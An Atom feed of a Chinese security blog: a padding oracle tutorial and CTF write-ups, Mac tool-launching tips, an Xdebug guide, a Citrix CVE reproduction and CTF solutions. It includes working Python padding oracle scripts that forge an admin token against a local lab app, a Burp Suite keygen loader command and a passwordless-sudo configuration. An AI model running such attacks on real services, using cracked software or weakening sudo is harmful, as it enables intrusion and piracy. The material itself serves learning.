<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>bufsnake</title>
  
  <subtitle>香香张</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://bufsnake.github.io/"/>
  <updated>2019-11-25T09:42:53.188Z</updated>
  <id>https://bufsnake.github.io/</id>
  
  <author>
    <name>bufsnake</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>TODO...</title>
    <link href="https://bufsnake.github.io/TODO.html"/>
    <id>https://bufsnake.github.io/TODO.html</id>
    <published>9999-09-09T01:09:09.000Z</published>
    <updated>2019-11-25T09:42:53.188Z</updated>
    
    <content type="html"><![CDATA[<p><strong>TODO…约束自己执行想要执行的事情</strong></p><h3 id="This-is-my-TODO…"><a href="#This-is-my-TODO…" class="headerlink" title="This is my TODO…"></a>This is my TODO…</h3><p><img src="/images/pasted-144.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>还在学习中…</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;TODO…约束自己执行想要执行的事情&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;This-is-my-TODO…&quot;&gt;&lt;a href=&quot;#This-is-my-TODO…&quot; class=&quot;headerlink&quot; title=&quot;This is my TODO…&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CBC加密模式攻击-集成题目</title>
    <link href="https://bufsnake.github.io/CBC%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F%E6%94%BB%E5%87%BB-%E9%9B%86%E6%88%90%E9%A2%98%E7%9B%AE.html"/>
    <id>https://bufsnake.github.io/CBC加密模式攻击-集成题目.html</id>
    <published>2020-04-27T03:35:21.000Z</published>
    <updated>2020-04-27T03:43:25.492Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>题目来源：[NPUCTF2020]web BUU已经有了</p><h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><p>打开链接得到源码</p><p>测试加密</p><p>得到</p><p>IV:6666666666666666</p><p>ly7auKVQCZWum/W/4osuPA==</p><p><img src="/images/pasted-249.png" srcset="/img/loading.gif" alt="upload successful"></p><p>测试解密，得到 1<br>这里的</p><pre><code class="php">return openssl_decrypt(base64_decode($data),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv) or die(&#39;False&#39;);</code></pre><p>运用短路运算，要么返回 1 要么返回 False</p><p>所以利用点为padding oracle attack</p><p><img src="/images/pasted-250.png" srcset="/img/loading.gif" alt="upload successful"></p><p>脚本如下</p><p><img src="/images/pasted-251.png" srcset="/img/loading.gif" alt="upload successful"></p><p>结果如下</p><p><img src="/images/pasted-252.png" srcset="/img/loading.gif" alt="upload successful"></p><p>得到第二关的地址：FlagIsHere.php</p><p><img src="/images/pasted-253.png" srcset="/img/loading.gif" alt="upload successful"></p><h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><p>访问FlagIsHere.php得到源码</p><p><img src="/images/pasted-254.png" srcset="/img/loading.gif" alt="upload successful"></p><p>由源码可知</p><pre><code class="php">$lalala = &#39;piapiapiapia&#39;;$iv = base64_decode(&#39;JwaFITevixiv4BbxHCph7A==&#39;);$tmp_id = &#39;weber&#39;;</code></pre><p>所以可以得到下面公式：</p><p><img src="/images/pasted-257.png" srcset="/img/loading.gif" alt="upload successful"></p><p>脚本如下：</p><p><img src="/images/pasted-255.png" srcset="/img/loading.gif" alt="upload successful"></p><p>结果如下：</p><p><img src="/images/pasted-256.png" srcset="/img/loading.gif" alt="upload successful"></p><p>由于得到的连接失效了，所以就没有继续下去</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;题目来源：[NPUCTF2020]web BUU已经有了&lt;/p&gt;
&lt;h2 id=&quot;第一关&quot;&gt;&lt;a href=&quot;#第一关&quot; class=&quot;he
      
    
    </summary>
    
      <category term="web" scheme="https://bufsnake.github.io/categories/web/"/>
    
    
      <category term="web" scheme="https://bufsnake.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Padding Oracle Attack</title>
    <link href="https://bufsnake.github.io/Padding-Oracle-Attack.html"/>
    <id>https://bufsnake.github.io/Padding-Oracle-Attack.html</id>
    <published>2020-04-23T11:16:57.000Z</published>
    <updated>2020-04-23T11:16:05.166Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><pre><code class="bash">1、在ECB模式的基础上，增强了块与块之间的联系。2、明文块先与IV XOR运算后，在进行加密，得到的密文充当下一个明文区块的IV...3、明文块填充方式，如果明文为abcd，长度为4，则需要填充12位，12的十六进制为\x0C，在最后加密的明文为abcd\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x0C</code></pre><h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><p><img src="/images/pasted-239.png" srcset="/img/loading.gif" alt="upload successful"></p><h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><p><img src="/images/pasted-240.png" srcset="/img/loading.gif" alt="upload successful"></p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="padding-Oracle-attack"><a href="#padding-Oracle-attack" class="headerlink" title="padding Oracle attack"></a>padding Oracle attack</h4><p><code>密文最后一个区块</code>通过<code>block cipher encryption</code>解密，得到<code>中间密文</code>，<code>中间密文</code>与<code>IV</code>异或得到明文。</p><p>如果输入错误的IV，也是可以解密的，但是<code>中间密文</code>和<code>错误的IV</code>异或后得到的填充值可能出现错误，那程序就会抛出(Padding Error)。</p><ul><li>第一步：填充错误</li></ul><p><img src="/images/pasted-241.png" srcset="/img/loading.gif" alt="upload successful"></p><ul><li>第二步：填充正确，填充为01</li></ul><p><img src="/images/pasted-242.png" srcset="/img/loading.gif" alt="upload successful"></p><ul><li>第三步：填充为0202</li></ul><p><img src="/images/pasted-243.png" srcset="/img/loading.gif" alt="upload successful"></p><ul><li><p>后续</p><p>正确的padding值只可能为：<br>1个字节的padding为<strong>0x01</strong><br>2个字节的padding为<strong>0x02,0x02</strong><br>3个字节的padding为<strong>0x03,0x03,0x03</strong><br>4个字节的padding为<strong>0x04,0x04,0x04,0x04</strong></p><p>……</p></li><li><p>以此类推，可以推导出所有的<code>中间密文</code>，<code>中间密文</code>的第一位需要爆破</p></li><li><p>控制<code>IV</code>可以将密文解密成任意明文(现在已知中间密文、可控IV)</p></li></ul><h5 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h5><pre><code class="php">// index.php&lt;?phperror_reporting(0);include(&#39;./key.php&#39;);define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);define(&quot;SECRET_KEY&quot;, $secret_key);session_start();function get_random_token(){    $random_token=&#39;&#39;;    for($i=0;$i&lt;16;$i++){        $random_token.=chr(rand(1,255));    }    return $random_token;}function get_identity(){    $defaultID = &quot;heheda&quot;;    $token = get_random_token();    $_SESSION[&#39;id&#39;] = base64_encode(openssl_encrypt($defaultID, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token));    setcookie(&quot;token&quot;, base64_encode($token));    $_SESSION[&#39;isadmin&#39;] = false;}function is_admin(){    if(isset($_SESSION[&#39;id&#39;])){        $token = base64_decode($_COOKIE[&#39;token&#39;]);        if($id = openssl_decrypt(base64_decode($_SESSION[&#39;id&#39;]), METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token)){            if($id == &quot;admin&quot;)                $_SESSION[&#39;isadmin&#39;] = true;        } else {            die(&quot;Error!&quot;);        }    }}if(!isset($_SESSION[&#39;id&#39;]))    get_identity();else {    is_admin();    if ($_SESSION[&quot;isadmin&quot;]){        echo &quot;You are admin!\n&quot;;        echo $flag;    }else        echo &quot;You are not admin!\n&quot;;}highlight_file(__file__);?&gt;// key.php&lt;?phpsession_start();$secret_key = &#39;teg2f4z5f7f5a2c1&#39;;$flag = &quot;flag{padding_oracle_attack_is_easy}&quot;;?&gt;</code></pre><ul><li><p>分析代码，可以看到关键点</p><p><img src="/images/pasted-244.png" srcset="/img/loading.gif" alt="upload successful"></p><p>解密时，如果出现Padding Error，则网页会显示Error!，否则会判断解密后的明文是否为admin。</p></li><li><p>判断<code>中间密文</code>的最后一字节</p><pre><code class="python">import requestsimport base64url = &#39;http://127.0.0.1/index.php&#39;for i in range(1,256):    token = &#39;\x00&#39;*15 + chr(i)    cookie = {&#39;token&#39;:base64.b64encode(token).replace(&quot;=&quot;,&quot;%3d&quot;).replace(&#39;/&#39;,&#39;%2f&#39;).replace(&#39;+&#39;,&#39;%2B&#39;),&quot;PHPSESSID&quot;:&quot;gaqekj8shscuprbvdfim9hcgj0&quot;}    if &quot;Error!&quot; not in requests.get(url,cookies=cookie).content:        print hex(i)</code></pre><p><img src="/images/pasted-245.png" srcset="/img/loading.gif" alt="upload successful"></p><p>这样就可以知道中间密文的最后一字节为0x3b ^ 0x1 = 0x3a</p></li><li><p>判断<code>中间密文</code>的倒数第二个字节</p><pre><code class="python">import requestsimport base64url = &#39;http://127.0.0.1/index.php&#39;for i in range(1,256):    token = &#39;\x00&#39;*14 + chr(i) + chr(0x3b^0x1^0x2)    cookie = {&#39;token&#39;:base64.b64encode(token).replace(&quot;=&quot;,&quot;%3d&quot;).replace(&#39;/&#39;,&#39;%2f&#39;).replace(&#39;+&#39;,&#39;%2B&#39;),&quot;PHPSESSID&quot;:&quot;gaqekj8shscuprbvdfim9hcgj0&quot;}    if &quot;Error!&quot; not in requests.get(url,cookies=cookie).content:        print hex(i)</code></pre><p><img src="/images/pasted-246.png" srcset="/img/loading.gif" alt="upload successful"></p><p>这样就可以知道中间密文的最后一字节为0x1a ^ 0x2 = 0x18</p></li><li><p>判断<code>中间密文</code>的倒数第三个字节</p><pre><code class="python">import requestsimport base64url = &#39;http://127.0.0.1/index.php&#39;for i in range(1,256):    token = &#39;\x00&#39;*13 + chr(i) + chr(0x1a^0x2^0x3) + chr(0x3b^0x1^0x2^0x2^0x3)    cookie = {&#39;token&#39;:base64.b64encode(token).replace(&quot;=&quot;,&quot;%3d&quot;).replace(&#39;/&#39;,&#39;%2f&#39;).replace(&#39;+&#39;,&#39;%2B&#39;),&quot;PHPSESSID&quot;:&quot;gaqekj8shscuprbvdfim9hcgj0&quot;}    if &quot;Error!&quot; not in requests.get(url,cookies=cookie).content:        print hex(i)</code></pre><p><img src="/images/pasted-247.png" srcset="/img/loading.gif" alt="upload successful"></p><p>这样就可以知道中间密文的最后一字节为0xd2 ^ 0x3 = 0xd1</p></li><li><p>以此类推</p><pre><code class="python">import requestsimport base64url = &#39;http://127.0.0.1/index.php&#39;token_temp = &#39;&#39;for j in range(1,17):    for i in range(1,256):        token = &#39;\x00&#39;*(16-j) + chr(i) + token_temp        cookie = {&#39;token&#39;:base64.b64encode(token).replace(&quot;=&quot;,&quot;%3d&quot;).replace(&#39;/&#39;,&#39;%2f&#39;).replace(&#39;+&#39;,&#39;%2B&#39;),&quot;PHPSESSID&quot;:&quot;gaqekj8shscuprbvdfim9hcgj0&quot;}        if &quot;Error!&quot; not in requests.get(url,cookies=cookie).content:            token_temp = chr(i ^ j ^ (j+1)) + token_temp            temp = &#39;&#39;            for i in range(1,len(token_temp)):                temp += chr(ord(token_temp[i]) ^ j ^ (j+1))            token_temp = token_temp[0] + temp            breakmiddle = &#39;&#39;for i in range(len(token_temp)):    middle += chr(ord(token_temp[i]) ^ 16)for i in range(1,256):    temp_middle = chr(i) + middle    plain = &#39;admin&#39; + &#39;\x0b&#39;*11    token = &#39;&#39;    for i in range(len(plain)):        token += chr(ord(temp_middle[i]) ^ ord(plain[i]))    cookie = {&#39;token&#39;:base64.b64encode(token).replace(&quot;=&quot;,&quot;%3d&quot;).replace(&#39;/&#39;,&#39;%2f&#39;).replace(&#39;+&#39;,&#39;%2B&#39;),&quot;PHPSESSID&quot;:&quot;gaqekj8shscuprbvdfim9hcgj0&quot;}    if &#39;admin&#39; in requests.get(url,cookies=cookie).content:        print requests.get(url,cookies=cookie).content        break</code></pre><p><img src="/images/pasted-248.png" srcset="/img/loading.gif" alt="upload successful"></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;1、在ECB模式的基础上，增强了块与块之间的联系。
2、明文块先与IV XOR运算后，在进行加密，
      
    
    </summary>
    
    
      <category term="padding oracle attack" scheme="https://bufsnake.github.io/tags/padding-oracle-attack/"/>
    
  </entry>
  
  <entry>
    <title>Mac 自动操作的极致体验</title>
    <link href="https://bufsnake.github.io/Mac-%E8%87%AA%E5%8A%A8%E6%93%8D%E4%BD%9C%E7%9A%84%E6%9E%81%E8%87%B4%E4%BD%93%E9%AA%8C.html"/>
    <id>https://bufsnake.github.io/Mac-自动操作的极致体验.html</id>
    <published>2020-03-20T02:24:51.000Z</published>
    <updated>2020-03-21T10:55:54.622Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>常用的jar包常常需要用掉一个终端页面，或是<code>&amp;&gt;&gt;/dev/null &amp;</code>后台运行，但是当前页面一但关闭，程序也就随之关闭，很是苦恼。</p></blockquote><blockquote><p>使用burpsuite的时候，发现<a href="https://www.sqlsec.com/2019/11/macbp.html" target="_blank" rel="noopener">国光</a>大佬发的一篇有趣的文章，遂尝试了一下。成果图如下</p></blockquote><p><img src="/images/pasted-222.png" srcset="/img/loading.gif" alt="upload successful"></p><p>按照操作，出现了点问题，如下：</p><p><img src="/images/pasted-223.png" srcset="/img/loading.gif" alt="upload successful"></p><pre><code class="php">操作“运行 Shell 脚本”遇到了错误：“Error: Unable to access jarfile burp-loader-keygen-2020_2.jar”Error: Unable to access jarfile burp-loader-keygen-2020_2.jar</code></pre><p>Google了一波，都说是内存分配原因，但是在iterm2中运行却没事，想到会不会是环境的问题，然后就在终端运行了</p><pre><code class="bash">➜  burpsuite2020.02 export |grep &quot;JAVA&quot;JAVA_HOME=/Library/Java/JavaVirtualMachines/jdk1.8.0_211.jdk/Contents/Home</code></pre><p>，找到唯一和java相关的环境变量，写到 <code>运行Shell脚本</code></p><pre><code class="bash">export JAVA_HOME=/Library/Java/JavaVirtualMachines/jdk1.8.0_211.jdk/Contents/Home &amp;&amp; cd /Users/bufsnake/Web-Pentest/burpsuite2020.02 &amp;&amp; java -noverify -Xbootclasspath/p:burp-loader-keygen-2020_2.jar -jar burpsuite_pro_v2020.2.jar</code></pre><p>运行成功</p><p><img src="/images/pasted-224.png" srcset="/img/loading.gif" alt="upload successful"></p><h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><ol><li>在之前，macos运行goby的时候，由于macos权限控制的比较狗，所以goby申请一些权限不过就会会卡住，如下图<br><img src="/images/pasted-225.png" srcset="/img/loading.gif" alt="upload successful"></li><li>iterm2中用sudo运行goby就可以进去(root权限)<br><img src="/images/pasted-226.png" srcset="/img/loading.gif" alt="upload successful"><br><img src="/images/pasted-227.png" srcset="/img/loading.gif" alt="upload successful"></li><li><p>然后就用了 自动操作 制作了一个app，发现goby真香</p><ul><li><p>设置sudo不需要输入密码</p><pre><code class="bash">➜  MacOS sudo cat /etc/sudoers...# root and users in group wheel can run anything on any machine as any userroot        ALL = (ALL) ALL%admin        ALL = (ALL) NOPASSWD:ALL...</code></pre><ul><li><p>注意点</p><p>a. 使用超级权限编辑/etc/sudoers，vim编辑后，然后键入:wq!，保存</p><p>b. 如果配置错误，sudo命令就会报错</p><pre><code class="bash">➜  MacOS sudo&gt;&gt;&gt; /etc/sudoers: syntax error near line 2 &lt;&lt;&lt;sudo: parse error in /etc/sudoers near line 2sudo: no valid sudoers sources found, quittingsudo: unable to initialize policy plugin</code></pre><ul><li>解决方法如下<br><img src="/images/pasted-228.png" srcset="/img/loading.gif" alt="upload successful"><br><img src="/images/pasted-229.png" srcset="/img/loading.gif" alt="upload successful"><br><img src="/images/pasted-230.png" srcset="/img/loading.gif" alt="upload successful"><br><img src="/images/pasted-231.png" srcset="/img/loading.gif" alt="upload successful"><br>重新编辑/etc/sudoers文件，当前权限就行，更改完之后，记得，将文件的权限还原，否则如下:<pre><code class="bash">➜  MacOS sudo vimsudo: /etc/sudoers is world writablesudo: no valid sudoers sources found, quittingsudo: unable to initialize policy plugin         </code></pre></li></ul></li></ul></li><li>设置 <code>运行 Shell 脚本</code><br><img src="/images/pasted-232.png" srcset="/img/loading.gif" alt="upload successful"><br><img src="/images/pasted-233.png" srcset="/img/loading.gif" alt="upload successful"><br>这样设置，很是舒服，有个小问题<br><img src="/images/pasted-234.png" srcset="/img/loading.gif" alt="upload successful"><br>可以在脚本后面键入<code>&amp;&gt;&gt;/dev/null &amp;</code>，就非常完美了<br><img src="/images/pasted-235.png" srcset="/img/loading.gif" alt="upload successful"></li><li>图标可以从goby.app中直接获取<br><img src="/images/pasted-236.png" srcset="/img/loading.gif" alt="upload successful"></li><li>成品图<br><img src="/images/pasted-237.png" srcset="/img/loading.gif" alt="upload successful"></li><li><p>测试扫描</p><p><code>注:</code>需要指定网卡<br><img src="/images/pasted-238.png" srcset="/img/loading.gif" alt="upload successful"><br><code>真香</code></p></li></ul></li></ol><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>通过此方法，又设置了几个软件，不用每次都依赖终端了，需要注意的是，文件的路径不要轻易改变，不然会打不开，还要重新制作，浪费时间。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;常用的jar包常常需要用掉一个终端页面，或是&lt;code&gt;&amp;amp;&amp;gt;&amp;gt;/dev/null &amp;amp;&lt;
      
    
    </summary>
    
      <category term="misc" scheme="https://bufsnake.github.io/categories/misc/"/>
    
    
      <category term="mac" scheme="https://bufsnake.github.io/tags/mac/"/>
    
  </entry>
  
  <entry>
    <title>Mac PHP调试环境搭建</title>
    <link href="https://bufsnake.github.io/Mac-PHP%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html"/>
    <id>https://bufsnake.github.io/Mac-PHP调试环境搭建.html</id>
    <published>2020-03-19T01:22:03.000Z</published>
    <updated>2020-03-19T01:54:38.316Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>需要的工具<code>MxSrvs</code>、<code>PHPStorm</code>、<code>Xdebug helper</code></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="MxSrvs"><a href="#MxSrvs" class="headerlink" title="MxSrvs"></a>MxSrvs</h3><ol><li><p>启动软件</p><p><img src="/images/pasted-209.png" srcset="/img/loading.gif" alt="upload successful"></p></li><li><p>打开配置编辑，编辑php.ini</p><p><img src="/images/pasted-210.png" srcset="/img/loading.gif" alt="upload successful"></p></li><li><p>配置Xdebug</p><p><code>MxSrvs</code>默认自带Xdebug，不需要去下载，配置如下图:</p><p><img src="/images/pasted-211.png" srcset="/img/loading.gif" alt="upload successful"></p><pre><code class="bash">[xdebug]zend_extension = &quot;/Applications/MxSrvs/bin/php/ext/xdebug.so&quot;xdebug.remote_enable=1xdebug.remote_connect_back=1xdebug.var_display_max_depth = 512xdebug.profiler_append = 1xdebug.profiler_enable_trigger = 1xdebug.max_nesting_level = 200xdebug.profiler_output_dir = &quot;/Applications/MxSrvs/logs/xdebug&quot;xdebug.profiler_output_name = &quot;cachegrind.out.%t.%p&quot;xdebug.idekey=&#39;PHPSTORM&#39;  # sessionkeyxdebug.remote_port=9000   #</code></pre></li><li><p>查看phpinfo信息</p><p><img src="/images/pasted-216.png" srcset="/img/loading.gif" alt="upload successful"></p></li></ol><h3 id="PHPStorm"><a href="#PHPStorm" class="headerlink" title="PHPStorm"></a>PHPStorm</h3><p><code>设置PHPStorm的Xdebug端口，端口由xdebug.remote_port决定</code></p><p><img src="/images/pasted-212.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-213.png" srcset="/img/loading.gif" alt="upload successful"></p><h3 id="Xdebug-helper-Chrome插件"><a href="#Xdebug-helper-Chrome插件" class="headerlink" title="Xdebug helper(Chrome插件)"></a>Xdebug helper(Chrome插件)</h3><ol><li><p>在Chrome插件商店下载安装即可</p><p><img src="/images/pasted-214.png" srcset="/img/loading.gif" alt="upload successful"></p></li><li><p>配置Xdebug Helper</p><p><code>IDE key由xdebug.idekey决定</code></p><p><img src="/images/pasted-215.png" srcset="/img/loading.gif" alt="upload successful"></p></li></ol><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><ol><li><p>在网站根目录添加一个PHP文件</p><p><img src="/images/pasted-217.png" srcset="/img/loading.gif" alt="upload successful"></p></li><li><p>开启监听</p><p><img src="/images/pasted-218.png" srcset="/img/loading.gif" alt="upload successful"></p></li><li><p>开启Xdebug Helper</p><p><img src="/images/pasted-219.png" srcset="/img/loading.gif" alt="upload successful"></p></li><li><p>刷新网页，phpstorm会提示以下内容，同意即可：</p><p><img src="/images/pasted-220.png" srcset="/img/loading.gif" alt="upload successful"></p></li><li><p>提示Debug session was finished without being paused</p><p>需要设置断点，然后刷新网页，就会显示如下界面。</p><p><img src="/images/pasted-221.png" srcset="/img/loading.gif" alt="upload successful"></p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;需要的工具&lt;code&gt;MxSrvs&lt;/code&gt;、&lt;code&gt;PHPStorm&lt;/code&gt;、&lt;code&gt;Xdebug helper&lt;/co
      
    
    </summary>
    
      <category term="web" scheme="https://bufsnake.github.io/categories/web/"/>
    
    
      <category term="php调试环境搭建" scheme="https://bufsnake.github.io/tags/php%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-19781:Citrix路径遍历复现</title>
    <link href="https://bufsnake.github.io/CVE-2019-19781-Citrix%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E5%A4%8D%E7%8E%B0.html"/>
    <id>https://bufsnake.github.io/CVE-2019-19781-Citrix路径遍历复现.html</id>
    <published>2020-01-09T11:11:08.000Z</published>
    <updated>2020-01-09T11:22:57.717Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>下班刚到家，发现了某平台的漏洞提示，然后就趁热复现了一波</p></blockquote><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><blockquote><p>twitter上的一位大佬公布的poc</p></blockquote><p><img src="/images/pasted-205.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>NetScaler Gateway</p></blockquote><p><img src="/images/pasted-206.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>Citrix Gateway</p></blockquote><p><img src="/images/pasted-207.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>修复后的效果(官方修复建议:<a href="https://support.citrix.com/article/CTX267679" target="_blank" rel="noopener">https://support.citrix.com/article/CTX267679</a>)</p></blockquote><p><img src="/images/pasted-208.png" srcset="/img/loading.gif" alt="upload successful"></p><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><blockquote><p>利用的复杂度不是很大。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;下班刚到家，发现了某平台的漏洞提示，然后就趁热复现了一波&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;利用
      
    
    </summary>
    
      <category term="学习研究" scheme="https://bufsnake.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="CVE-2019-19781" scheme="https://bufsnake.github.io/tags/CVE-2019-19781/"/>
    
  </entry>
  
  <entry>
    <title>2019领航杯WP</title>
    <link href="https://bufsnake.github.io/2019%E9%A2%86%E8%88%AA%E6%9D%AFWP.html"/>
    <id>https://bufsnake.github.io/2019领航杯WP.html</id>
    <published>2019-12-13T18:25:17.000Z</published>
    <updated>2019-12-13T18:39:34.982Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-编码编码"><a href="#1-编码编码" class="headerlink" title="1.编码编码"></a>1.编码编码</h2><p>base64解码即可得到flag!</p><p><img src="/images/pasted-183.png" srcset="/img/loading.gif" alt="upload successful"></p><p>flag:welcometothepilotcup</p><h2 id="2-取证分析"><a href="#2-取证分析" class="headerlink" title="2.取证分析"></a>2.取证分析</h2><p><img src="/images/pasted-184.png" srcset="/img/loading.gif" alt="upload successful"></p><p>利用脚本得到flag.png，用winhex删除开头多余数据，png文件头为89 50 开头</p><p><img src="/images/pasted-185.png" srcset="/img/loading.gif" alt="upload successful"></p><p>结尾是AE 42 60 82</p><p>去除掉无用信息，得到flag，<strong>b91011fc</strong></p><h2 id="3-stegano-l"><a href="#3-stegano-l" class="headerlink" title="3.stegano l"></a>3.stegano l</h2><p>打开查看源码，得到flag就是passwd：后面字符 steganoI</p><p><img src="/images/pasted-186.png" srcset="/img/loading.gif" alt="upload successful"></p><p>flag:steganol</p><h2 id="4-stegano"><a href="#4-stegano" class="headerlink" title="4.stegano"></a>4.stegano</h2><p>binwalk查看文件</p><p><img src="/images/pasted-187.png" srcset="/img/loading.gif" alt="upload successful"></p><p>foremost分离文件</p><p><img src="/images/pasted-188.png" srcset="/img/loading.gif" alt="upload successful"></p><p>得到flag</p><p><img src="/images/pasted-189.png" srcset="/img/loading.gif" alt="upload successful"></p><p>flag:EORDFFOMFPMA</p><h2 id="5-lsb"><a href="#5-lsb" class="headerlink" title="5.lsb"></a>5.lsb</h2><p>用StegSolve打开图片，调制Red pane 3 即可得到flag</p><p><img src="/images/pasted-190.png" srcset="/img/loading.gif" alt="upload successful"></p><p>flag:ONPGRAMBCICM</p><h2 id="6-恢复与解密"><a href="#6-恢复与解密" class="headerlink" title="6.恢复与解密"></a>6.恢复与解密</h2><p>下载附件,将其中的xty.img使用Diskgenius打开.</p><p>选择恢复文件</p><p><img src="/images/pasted-191.png" srcset="/img/loading.gif" alt="upload successful"></p><p>打开其中的INode00000010,可以看到密文 aWdxNDs3NDFSOzFpa1I1MWliT08waWdx</p><p>使用脚本对密文进行解密</p><pre><code class="python">import stringfrom base64 import *b=b64decode(&quot;aWdxNDs3NDFSOzFpa1I1MWliT08waWdx&quot;)data=list(b)for k in range(0,200):    key=&quot;&quot;    for i in range(len(data)):        key+=chr(ord(data[i])^k)    print (key)</code></pre><p>结果中没有特殊符号的则是flag</p><p>flag:jdr78472Q82jhQ62jaLL3jdr</p><h2 id="7-文件提取"><a href="#7-文件提取" class="headerlink" title="7.文件提取"></a>7.文件提取</h2><p>下载附件,使用记事本打开flag.exe.将其中的base64编码转换成图片</p><p><img src="/images/pasted-192.png" srcset="/img/loading.gif" alt="upload successful"></p><p>用记事本打开图片,可以在图片的最后看到flag</p><p>flag{068EEF6A7BAD3FDF}</p><h2 id="8-凯撒1"><a href="#8-凯撒1" class="headerlink" title="8.凯撒1"></a>8.凯撒1</h2><p>使用凯撒密码转换密文.</p><p><img src="/images/pasted-193.png" srcset="/img/loading.gif" alt="upload successful"></p><p>最后一个单词是flag</p><p>flag:moconlfpeold</p><h2 id="9-凯撒2"><a href="#9-凯撒2" class="headerlink" title="9.凯撒2"></a>9.凯撒2</h2><p>payload:</p><pre><code class="python">a = &quot;0B 33 33 28 20 2E 33 26 70 20 3D 33 39 20 37 33 30 3A 29 28 20 33 32 29 20 31 33 36 29 20 27 2C 25 30 30 29 32 2B 29 20 2D 32 20 3D 33 39 36 20 2E 33 39 36 32 29 3D 72 20 18 2C 2D 37 20 33 32 29 20 3B 25 37 20 2A 25 2D 36 30 3D 20 29 25 37 3D 20 38 33 20 27 36 25 27 2F 72 20 1B 25 37 32 6B 38 20 2D 38 03 20 75 76 7C 20 2F 29 3D 37 20 2D 37 20 25 20 35 39 2D 38 29 20 37 31 25 30 30 20 2F 29 3D 37 34 25 27 29 70 20 37 33 20 2D 38 20 37 2C 33 39 30 28 32 6B 38 20 2C 25 3A 29 20 38 25 2F 29 32 20 3D 33 39 20 38 33 33 20 30 33 32 2B 20 38 33 20 28 29 27 36 3D 34 38 20 38 2C 2D 37 20 31 29 37 37 25 2B 29 72 20 1B 29 30 30 20 28 33 32 29 70 20 3D 33 39 36 20 37 33 30 39 38 2D 33 32 20 2D 37 20 31 25 37 37 32 34 2A 33 25 37 26 37 72&quot;ls = []for i in a.split(&#39; &#39;):    ls.append(int(i, 16))print(ls)for i in range(-100, 100):    try:        for j in ls:            print(chr(j+i), end=&#39;&#39;)        print()    except:        pass</code></pre><p>得到flag如图中阴影</p><p><img src="/images/pasted-194.png" srcset="/img/loading.gif" 